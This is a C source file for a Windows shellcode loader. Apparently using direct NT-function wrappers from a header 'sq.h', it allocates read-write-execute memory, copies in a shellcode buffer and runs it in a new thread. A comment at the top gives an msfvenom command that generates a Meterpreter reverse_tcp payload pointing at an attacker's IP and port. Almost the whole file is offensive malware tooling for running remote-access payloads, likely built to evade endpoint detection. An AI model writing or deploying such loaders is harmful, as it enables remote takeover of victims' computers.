    // define your shellcode
    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f c -b "\x00\x0a\x0d" EXITFUNC=thread 
    // or create you personall shellcode 

#include "sq.h"

int main() {
    if (!InitNtFunctions()) {
        printf("Failed to initialize NT functions\n");
        return 1;
    }

    processHandle = GetCurrentProcess();
    baseAddress = NULL;
    regionSize = sizeof(shellcode);
    allocationType = MEM_COMMIT | MEM_RESERVE;
    protect = PAGE_EXECUTE_READWRITE;

    Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect);
    Sq_WriteVirtualMemory(processHandle, baseAddress, shellcode, sizeof(shellcode));

    protect = PAGE_EXECUTE_READWRITE;
    Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect);

    Sq_CreateThreadEx(threadHandle, processHandle, baseAddress);
    Sq_WaitForSingleObject(threadHandle);

    Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize);

    Sq_Close(processHandle);

    return 0;
}

